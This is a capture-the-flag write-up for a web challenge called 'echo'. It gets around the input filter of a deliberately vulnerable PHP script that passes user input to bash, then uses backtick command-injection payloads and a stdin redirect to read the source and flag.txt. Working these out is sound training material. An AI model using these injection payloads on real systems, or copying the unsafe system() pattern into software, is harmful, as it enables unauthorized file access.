# echo

Thank you to `N1z0ku` and [noFF](https://github.com/srinivas991) for their hints!

## Escaping

Using \`something\` we get command injection. Running \`ls\` we can see `index.php` in the current directory. We can `cat` it out!:
```
`cat index.php`
``` 

```php
 <?php
 $to_echo = $_REQUEST['echo'];
 $cmd = "bash -c 'echo " . $to_echo . "'";
 if (isset($to_echo)) {
     if ($to_echo == "") {
         print "Please don't be lame, I can't just say nothing.";
     } elseif (
         preg_match('/[#!@%^&*()$_+=\-\[\]\';,{}|":>?~\\\\]/', $to_echo)
     ) {
         print "Hey mate, you seem to be using some characters that makes me wanna throw it back in your face >:(";
     } elseif ($to_echo == "cat") {
         print "Meowwww... Well you asked for a cat didn't you? That's the best impression you're gonna get :/";
     } elseif (strlen($to_echo) > 15) {
         print "Man that's a mouthful to echo, what even?";
     } else {
         system($cmd);
     }
 } else {
     print "Alright, what would you have me say?";
 }
  ?>
```
In the source code we can see why this works. As our input is in: `"bash -c 'echo " . $to_echo . "'";` and \`\` is a type of bash expansion. 

## Exploitation

Now we can have a look at the parent directory: 
```
`ls ../`
```
Which shows: `flag.txt html`</br>
How can we read `flag.txt`? From the source code we know that our input must be under smaller or equal to 15 characters. So the following doesn't work (and I tried it all):
```
less ../flag.txt
more ../flag.txt
cat ../flag.txt
nl ../flag.txt
```
Time to look at the regex, don't you think? Almost everything is missing.... except for one thing. `<` the redirect to stdin operator. And we would redirect it straight to the `echo` command!
```
`< ../flag.txt`

flag{1beadaf44586ea4aba2ea9a00c5b6d91}
```
Yes!